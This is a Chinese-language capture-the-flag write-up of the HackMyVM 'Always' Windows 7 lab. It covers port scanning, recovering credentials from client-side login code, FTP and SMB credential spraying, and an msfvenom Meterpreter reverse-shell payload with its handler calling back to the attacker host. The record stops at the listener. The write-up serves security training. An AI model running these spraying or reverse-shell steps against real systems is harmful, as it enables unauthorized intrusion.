{"pageProps":{"postData":{"id":"HackMyVMAlways","contentHtml":"<h1>Always.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Always\">https://hackmyvm.eu/machines/machine.php?vm=Always</a></p>\n</blockquote>\n<p>Notes: <strong>Beginner friendly, easy windows box. Basic enumeration skills and windows privilege escalation knowledge will open your way.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-css\">⚡ root<span class=\"hljs-keyword\">@kali</span>  ~  nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94S</span>VN ( <span class=\"hljs-attribute\">https</span>://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">16</span> EST\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00063s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">0</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">09</span> (Unknown)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00038s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F4:<span class=\"hljs-number\">7</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-number\">59</span> (Oracle VirtualBox virtual NIC)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.37</span>\nHost is up (<span class=\"hljs-number\">0.00049s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A1:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">19</span> (Oracle VirtualBox virtual NIC)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nHost is up.\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned in <span class=\"hljs-number\">15.10</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.37\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:20 EST\nWarning: 192.168.56.37 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.37\nHost is up (0.00090s latency).\nNot shown: 65223 closed tcp ports (conn-refused), 299 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n5357/tcp  open  wsdapi\n8080/tcp  open  http-proxy\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\nMAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~  <span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-sT</span> <span class=\"hljs-selector-tag\">-A</span> <span class=\"hljs-selector-tag\">-T4</span> <span class=\"hljs-selector-tag\">-O</span> <span class=\"hljs-selector-tag\">-p</span> <span class=\"hljs-number\">21</span>,<span class=\"hljs-number\">8080</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.37</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-25 21:24 EST</span>\nNmap scan report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.37</span>\nHost is up (<span class=\"hljs-number\">0.00064s</span> latency).\n\nPORT     STATE SERVICE            VERSION\n<span class=\"hljs-number\">21</span>/tcp   open  ftp                Microsoft ftpd\n| <span class=\"hljs-attribute\">ftp-syst</span>:\n|_  <span class=\"hljs-attribute\">SYST</span>: Windows_NT\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc              Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp  open  microsoft-ds       Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> microsoft-ds (<span class=\"hljs-attribute\">workgroup</span>: WORKGROUP)\n<span class=\"hljs-number\">3389</span>/tcp open  ssl/ms-wbt-server?\n| <span class=\"hljs-attribute\">ssl-cert</span>: <span class=\"hljs-attribute\">Subject</span>: commonName=Always-PC\n| <span class=\"hljs-keyword\">Not</span> valid <span class=\"hljs-attribute\">before</span>: <span class=\"hljs-number\">2024</span><span class=\"hljs-attribute\">-10-02T08</span>:<span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">05</span>\n|_Not valid <span class=\"hljs-attribute\">after</span>:  <span class=\"hljs-number\">2025</span><span class=\"hljs-attribute\">-04-03T08</span>:<span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">05</span>\n|<span class=\"hljs-attribute\">_ssl-date</span>: <span class=\"hljs-number\">2025</span><span class=\"hljs-attribute\">-02-26T02</span>:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">46</span>+<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>; <span class=\"hljs-number\">0s</span> from scanner time.\n<span class=\"hljs-number\">8080</span>/tcp open  http               Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">57</span> ((Win64))\n|<span class=\"hljs-attribute\">_http-server-header</span>: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">57</span> (Win64)\n| <span class=\"hljs-attribute\">http-methods</span>:\n|_  Potentially risky <span class=\"hljs-attribute\">methods</span>: TRACE\n|<span class=\"hljs-attribute\">_http-open-proxy</span>: Proxy might be redirecting requests\n|<span class=\"hljs-attribute\">_http-title</span>: We Are Sorry\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-attribute\">A1</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">19</span> (Oracle VirtualBox virtual NIC)\n<span class=\"hljs-attribute\">Warning</span>: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-attribute\">type</span>: general purpose\n<span class=\"hljs-attribute\">Running</span>: Microsoft Windows <span class=\"hljs-number\">7</span>|<span class=\"hljs-number\">2008</span>|<span class=\"hljs-number\">8.1</span>\nOS <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:<span class=\"hljs-attribute\">windows_7</span>::- <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:<span class=\"hljs-attribute\">windows_7</span>::sp1 <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:<span class=\"hljs-attribute\">windows_server_2008</span>::sp1 <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:<span class=\"hljs-attribute\">windows_server_2008</span>:r2 <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:windows_8 <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:windows_8.<span class=\"hljs-number\">1</span>\nOS <span class=\"hljs-attribute\">details</span>: Microsoft Windows <span class=\"hljs-number\">7</span> SP0 - SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> R2, Windows <span class=\"hljs-number\">8</span>, or Windows <span class=\"hljs-number\">8.1</span> Update <span class=\"hljs-number\">1</span>\nNetwork <span class=\"hljs-attribute\">Distance</span>: <span class=\"hljs-number\">1</span> hop\nService <span class=\"hljs-attribute\">Info</span>: <span class=\"hljs-attribute\">Host</span>: ALWAYS-PC; <span class=\"hljs-attribute\">OS</span>: Windows; <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:windows\n\nHost script <span class=\"hljs-attribute\">results</span>:\n| <span class=\"hljs-attribute\">smb-security-mode</span>:\n|   <span class=\"hljs-attribute\">account_used</span>: guest\n|   <span class=\"hljs-attribute\">authentication_level</span>: user\n|   <span class=\"hljs-attribute\">challenge_response</span>: supported\n|_  <span class=\"hljs-attribute\">message_signing</span>: disabled (dangerous, but default)\n|<span class=\"hljs-attribute\">_clock-skew</span>: <span class=\"hljs-attribute\">mean</span>: -<span class=\"hljs-number\">29</span>m59s, <span class=\"hljs-attribute\">deviation</span>: <span class=\"hljs-number\">59</span>m59s, <span class=\"hljs-attribute\">median</span>: <span class=\"hljs-number\">0s</span>\n| <span class=\"hljs-attribute\">smb-os-discovery</span>:\n|   <span class=\"hljs-attribute\">OS</span>: Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> (Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-number\">6.1</span>)\n|   OS <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">microsoft</span>:<span class=\"hljs-attribute\">windows_7</span>::<span class=\"hljs-attribute\">sp1</span>:professional\n|   Computer <span class=\"hljs-attribute\">name</span>: Always-PC\n|   NetBIOS computer <span class=\"hljs-attribute\">name</span>: ALWAYS-PC\\x00\n|   <span class=\"hljs-attribute\">Workgroup</span>: WORKGROUP\\x00\n|_  System <span class=\"hljs-attribute\">time</span>: <span class=\"hljs-number\">2025</span><span class=\"hljs-attribute\">-02-26T04</span>:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">41</span>+<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">00</span>\n| <span class=\"hljs-attribute\">smb2-time</span>:\n|   <span class=\"hljs-attribute\">date</span>: <span class=\"hljs-number\">2025</span><span class=\"hljs-attribute\">-02-26T02</span>:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">41</span>\n|_  <span class=\"hljs-attribute\">start_date</span>: <span class=\"hljs-number\">2025</span><span class=\"hljs-attribute\">-02-26T02</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">25</span>\n| <span class=\"hljs-attribute\">smb2-security-mode</span>:\n|   <span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">0</span>:\n|_    Message signing enabled but <span class=\"hljs-keyword\">not</span> required\n|<span class=\"hljs-attribute\">_nbstat</span>: NetBIOS <span class=\"hljs-attribute\">name</span>: ALWAYS-PC, NetBIOS <span class=\"hljs-attribute\">user</span>: , NetBIOS <span class=\"hljs-attribute\">MAC</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-attribute\">a1</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">19</span> (Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.64</span> ms <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.37</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">94.06</span> seconds\n</code></pre>\n<p>可以看到靶机不是域内主机，而是普通的工作组，主机可能是<code>win7</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -script=vuln -p 21,8080,3389,445,135,139 192.168.56.37\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:47 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.37\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE\n21/tcp   open  ftp\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n8080/tcp open  http-proxy\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server<span class=\"hljs-string\">'s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-trace: TRACE is enabled\n| http-enum: \n|   /admin/: Possible admin folder\n|   /admin/index.html: Possible admin folder\n|_  /Admin/: Possible admin folder\nMAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n</span></code></pre>\n<p><code>8080</code>端口是<code>web</code>服务。存在<code>ftp</code>，可能使用匿名账户进行登录。</p>\n<p>优先级 <code>21</code> > <code>445</code> > <code>8080</code></p>\n<p>尝试下<code>FTP</code>以及<code>SMB</code>是否允许匿名用户</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  ftp 192.168.56.37\nConnected to 192.168.56.37.\n220 Microsoft FTP Service\nName (192.168.56.37:root): anonymous\n331 Password required <span class=\"hljs-keyword\">for</span> anonymous.\nPassword: \n530 User cannot <span class=\"hljs-built_in\">log</span> <span class=\"hljs-keyword\">in</span>.\nftp: Login failed\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  smbclient -L 192.168.56.37 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<p>访问<code>HTTP</code>服务，并收集指纹</p>\n<p><img src=\"/post-images/HackMyVMAlways/image133.png\" alt=\"image.png\"></p>\n<p>扫一下目录</p>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~  <span class=\"hljs-selector-tag\">gobuster</span> <span class=\"hljs-selector-tag\">dir</span> <span class=\"hljs-selector-tag\">-u</span> <span class=\"hljs-selector-tag\">http</span>:<span class=\"hljs-comment\">//192.168.56.37:8080 -w /usr/share/wordlists/dibuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp</span>\n===============================================================\n<span class=\"hljs-selector-tag\">Gobuster</span> <span class=\"hljs-selector-tag\">v3</span><span class=\"hljs-selector-class\">.6</span>\n<span class=\"hljs-selector-tag\">by</span> <span class=\"hljs-selector-tag\">OJ</span> <span class=\"hljs-selector-tag\">Reeves</span> (<span class=\"hljs-variable\">@TheColonial</span>) <span class=\"hljs-selector-tag\">&#x26;</span> <span class=\"hljs-selector-tag\">Christian</span> <span class=\"hljs-selector-tag\">Mehlmauer</span> (<span class=\"hljs-variable\">@firefart</span>)\n===============================================================\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Url</span>:                     <span class=\"hljs-selector-tag\">http</span>:<span class=\"hljs-comment\">//192.168.56.37:8080</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Method</span>:                  <span class=\"hljs-selector-tag\">GET</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Threads</span>:                 <span class=\"hljs-number\">10</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Wordlist</span>:                /<span class=\"hljs-selector-tag\">usr</span>/<span class=\"hljs-selector-tag\">share</span>/<span class=\"hljs-selector-tag\">wordlists</span>/<span class=\"hljs-selector-tag\">dirbuster</span>/<span class=\"hljs-selector-tag\">directory-list-2</span><span class=\"hljs-selector-class\">.3-medium</span><span class=\"hljs-selector-class\">.txt</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Negative</span> <span class=\"hljs-selector-tag\">Status</span> <span class=\"hljs-selector-tag\">codes</span>:   <span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">502</span>,<span class=\"hljs-number\">429</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">User</span> <span class=\"hljs-selector-tag\">Agent</span>:              <span class=\"hljs-selector-tag\">gobuster</span>/<span class=\"hljs-number\">3.6</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Extensions</span>:              <span class=\"hljs-selector-tag\">php</span>,<span class=\"hljs-selector-tag\">asp</span>,<span class=\"hljs-selector-tag\">zip</span>,<span class=\"hljs-selector-tag\">txt</span>,<span class=\"hljs-selector-tag\">html</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Timeout</span>:                 <span class=\"hljs-number\">10s</span>\n===============================================================\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">gobuster</span> <span class=\"hljs-selector-tag\">in</span> <span class=\"hljs-selector-tag\">directory</span> <span class=\"hljs-selector-tag\">enumeration</span> <span class=\"hljs-selector-tag\">mode</span>\n===============================================================\n/<span class=\"hljs-selector-tag\">index</span><span class=\"hljs-selector-class\">.html</span>           (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">200</span>) <span class=\"hljs-selector-attr\">[Size: 178]</span>\n/<span class=\"hljs-selector-tag\">admin</span>                (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">301</span>) <span class=\"hljs-selector-attr\">[Size: 240]</span> <span class=\"hljs-selector-attr\">[--> http://192.168.56.37:8080/admin/]</span>\n/<span class=\"hljs-selector-tag\">Index</span><span class=\"hljs-selector-class\">.html</span>           (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">200</span>) <span class=\"hljs-selector-attr\">[Size: 178]</span>\n/<span class=\"hljs-selector-tag\">INDEX</span><span class=\"hljs-selector-class\">.html</span>           (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">200</span>) <span class=\"hljs-selector-attr\">[Size: 178]</span>\n/<span class=\"hljs-selector-tag\">Admin</span>                (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">301</span>) <span class=\"hljs-selector-attr\">[Size: 240]</span> <span class=\"hljs-selector-attr\">[--> http://192.168.56.37:8080/Admin/]</span>\n<span class=\"hljs-selector-tag\">Progress</span>: <span class=\"hljs-number\">1323360</span> / <span class=\"hljs-number\">1323366</span> (<span class=\"hljs-number\">100.00%</span>)\n===============================================================\n<span class=\"hljs-selector-tag\">Finished</span>\n===============================================================\n</code></pre>\n<p>访问<code>admin</code>是登陆页</p>\n<p><img src=\"/post-images/HackMyVMAlways/image134.png\" alt=\"image.png\"></p>\n<h2>前端验证</h2>\n<p>输入密码账号的时候会发现抓不到包，不会是前端验证吧</p>\n<p>看一下源码还真的是，得到账号密码<code>admin</code>:<code>adminpass123</code></p>\n<p><img src=\"/post-images/HackMyVMAlways/image135.png\" alt=\"image.png\"></p>\n<p>进去后有一串字符，一眼<code>base64</code> ，解码后是：<code>ftpuser</code>:<code>KeepGoingBro!!!</code></p>\n<p><img src=\"/post-images/HackMyVMAlways/image136.png\" alt=\"image.png\"></p>\n<h2>FTP</h2>\n<p>得到一组用户名密码，看着像是<code>FTP</code>的用户</p>\n<p>使用得到的用户名密码进行登录，成功进入</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  ftp 192.168.56.37\nConnected to 192.168.56.37.\n220 Microsoft FTP Service\nName (192.168.56.37:root): ftpuser\n331 Password required <span class=\"hljs-keyword\">for</span> ftpuser.\nPassword: \n230 User logged <span class=\"hljs-keyword\">in</span>.\nRemote system <span class=\"hljs-built_in\">type</span> is Windows_NT.\nftp> \n</code></pre>\n<p>将文件拉取下来</p>\n<pre><code class=\"hljs language-bash\">ftp> <span class=\"hljs-built_in\">ls</span>\n229 Entering Extended Passive Mode (|||49160|)\n125 Data connection already open; Transfer starting.\n10-01-24  07:17PM                   56 robots.txt\n226 Transfer complete.\nftp> get robots.txt\n<span class=\"hljs-built_in\">local</span>: robots.txt remote: robots.txt\n229 Entering Extended Passive Mode (|||49161|)\n125 Data connection already open; Transfer starting.\n100% |*******************************************************************************************************************************************************************|    56      118.62 KiB/s    00:00 ETA\n226 Transfer complete.\n56 bytes received <span class=\"hljs-keyword\">in</span> 00:00 (58.30 KiB/s)\n</code></pre>\n<p>得到文件<code>robots.txt</code> ，得到<code>/admins-secret-pagexxx.html</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/always  <span class=\"hljs-built_in\">cat</span> robots.txt        \nUser-agent: *\nDisallow: /admins-secret-pagexxx.html\n</code></pre>\n<p>访问<code>/admins-secret-pagexxx.html</code></p>\n<p><img src=\"/post-images/HackMyVMAlways/image137.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">管理员的秘密笔记\n\n1) 禁用防火墙和 Windows Defender。\n2) 启用 FTP 和 SSH。\n3) 启动 Apache 服务器。\n4) 不要忘记更改用户“always”的密码。当前密码为“WW91Q2FudEZpbmRNZS4hLiE=”。\n</code></pre>\n<p>得到一组用户 <code>always</code>:<code>YouCantFindMe.!.!</code></p>\n<p>但是我通过这凭证无法获得任何信息，随后我将之前的获得用户名和密码做了一个字典</p>\n<pre><code class=\"hljs language-bash\">always\nYouCantFindMe.!.!\nftpuser\nKeepGoingBro!!!\n</code></pre>\n<p>然后爆破</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/always  nxc smb 192.168.56.37 -u up.txt -p up.txt\nSMB         192.168.56.37   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)\nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\always:always STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\YouCantFindMe.!.!:always STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\ftpuser:always STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\KeepGoingBro!!!:always STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\always:YouCantFindMe.!.! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\YouCantFindMe.!.!:YouCantFindMe.!.! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\ftpuser:YouCantFindMe.!.! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\KeepGoingBro!!!:YouCantFindMe.!.! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\always:ftpuser STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\YouCantFindMe.!.!:ftpuser STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\ftpuser:ftpuser STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\KeepGoingBro!!!:ftpuser STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\always:KeepGoingBro!!! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\\YouCantFindMe.!.!:KeepGoingBro!!! STATUS_LOGON_FAILURE \nSMB         192.168.56.37   445    ALWAYS-PC        [+] Always-PC\\ftpuser:KeepGoingBro!!! \n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/always  nxc rdp 192.168.56.37 -u up.txt -p up.txt\n\nRDP         192.168.56.37   3389   192.168.56.37    [*] Probably old, doesn<span class=\"hljs-string\">'t not support HYBRID or HYBRID_EX (nla:False)\nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\always:always \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\YouCantFindMe.!.!:always \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\ftpuser:always \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\KeepGoingBro!!!:always \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\always:YouCantFindMe.!.! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\YouCantFindMe.!.!:YouCantFindMe.!.! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\ftpuser:YouCantFindMe.!.! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\KeepGoingBro!!!:YouCantFindMe.!.! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\always:ftpuser \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\YouCantFindMe.!.!:ftpuser \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\ftpuser:ftpuser \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\KeepGoingBro!!!:ftpuser \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\always:KeepGoingBro!!! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\YouCantFindMe.!.!:KeepGoingBro!!! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\ftpuser:KeepGoingBro!!! \nRDP         192.168.56.37   3389   192.168.56.37    [-] None\\KeepGoingBro!!!:KeepGoingBro!!! \n</span></code></pre>\n<p>发现<code>ftpuser</code>的凭据可以用到<code>smb</code> ，我们尝试通过使用<code>ftpuser</code>登录<code>rdp</code> ，当貌似其不是远程登录组的用户</p>\n<p><img src=\"/post-images/HackMyVMAlways/image138.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<p>很奇怪，没有想到可以利用的点，于是进行本地登录，记得先将左上角的键盘切换为<code>EN</code></p>\n<p>输入<code>ftpuser</code>用户密码后成功进入</p>\n<p><img src=\"/post-images/HackMyVMAlways/image139.png\" alt=\"image.png\"></p>\n<p>上线<code>MSF</code>，先生成<code>Payload</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/always  msfvenom -p windows/x64/meterpreter/reverse_tcp lpost=4444 lhost=192.168.56.4 -f exe -o shell.exe  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No <span class=\"hljs-built_in\">arch</span> selected, selecting <span class=\"hljs-built_in\">arch</span>: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: shell.exe\n</code></pre>\n<p><code>MSF</code>监听</p>\n<pre><code class=\"hljs language-bash\">msf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport 4444\nlport => 4444\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost 192.168.56.4\nlhost => 192.168.56.4\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 192.168.56.4:4444 \n</code></pre>\n<p>将<code>shell.exe</code>上传到靶机，然后运行，即可获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 192.168.56.4:4444 \n^[[D[*] 